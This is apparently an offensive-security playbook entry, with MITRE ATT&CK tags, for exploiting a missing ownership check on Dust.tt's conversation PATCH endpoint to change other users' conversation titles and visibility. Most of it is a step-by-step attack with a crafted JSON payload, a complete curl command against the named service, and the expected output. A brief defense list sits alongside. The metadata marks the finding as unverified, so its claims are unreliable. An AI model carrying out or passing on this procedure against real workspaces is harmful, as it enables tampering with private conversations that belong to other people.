---
id: proc-dust-edit-unauth-001
tags:
  - broken-access-control
  - data-manipulation
  - dust-tt
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-dust-edit-conversation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data Manipulation]]'
updated_at: '2025-12-14T17:30:26.884Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Stored Data Manipulation]]'
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Data Manipulation]]'
---
# Edit-Unauthorized-Conversation

## Summary

This procedure exploits missing permission checks to modify metadata and potentially content of other users' conversations in Dust.tt, altering integrity.

## Description

The PATCH /api/w/<Workspace-id>/assistant/conversations/<conversation-id> endpoint allows updates to fields like title and visibility without verifying ownership, enabling attackers to tamper with private threads.

## Requirements

1. Authenticated session
2. Workspace and conversation IDs
3. JSON payload for updates

## Defense

Defensive measures and detection strategies:

- Validate user permissions on all mutating API calls
- Track changes with versioning and audit logs
- Restrict visibility updates to owners only

## Objectives

1. Alter conversation title and visibility
2. Compromise data integrity
3. Potentially inject misleading content

## Instructions

### Step 1: Prepare Update Payload

**Context**: Define changes, e.g., new title and visibility.

Craft JSON: {"title":"Updated by Attacker","visibility":"unlisted"}

### Step 2: Send Patch Request

**Context**: Apply modifications via API.

**Command** ([[commands/curl-dust-edit-conversation]]):
```bash
curl -X PATCH "https://dust.tt/api/w/mRHt1cXVmK/assistant/conversations/conv_abc123" -H "Authorization: Bearer YOUR_SESSION_TOKEN" -H "Content-Type: application/json" -d '{"title":"Updated by Attacker","visibility":"unlisted"}'
```

> Expected output: Updated JSON response, e.g., {"conversation": {"title": "Updated by Attacker", "visibility": "unlisted", ... }}. Confirm by re-reading the conversation.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]] Impact

### Techniques

- [[Data Manipulation]] Data Manipulation

### Sub-Techniques

- [[Stored Data Manipulation]] Stored Data Manipulation

## Commands Used

- [[commands/curl-dust-edit-conversation]]

## Tools Used

-

## Tags

- [[broken-access-control]]
- [[dust-tt]]
